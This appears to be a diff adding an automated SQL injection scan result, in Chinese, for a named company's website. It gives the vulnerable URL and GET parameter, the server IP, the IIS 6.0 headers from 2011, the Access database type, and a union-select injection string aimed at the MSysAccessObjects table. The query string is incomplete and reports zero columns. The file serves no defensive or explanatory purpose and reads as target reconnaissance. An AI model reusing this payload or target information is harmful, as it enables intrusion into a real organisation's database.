@@ -1,0 +1,25 @@
+■漏洞信息:============================================================
+ ·URL:http://www.gdzy.com.cn/news_show.asp?info_id=2126
+ ·页面标题：广东振业自动化工程有限公司
+ ·参数:info_id=2126
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:121.14.2.128
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 27 Aug 2011 07:18:32 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 4157
+Content-Type: text/html
+Expires: Sat, 27 Aug 2011 07:18:32 GMT
+Set-Cookie: lang=c; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 0  显示的列= 0
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
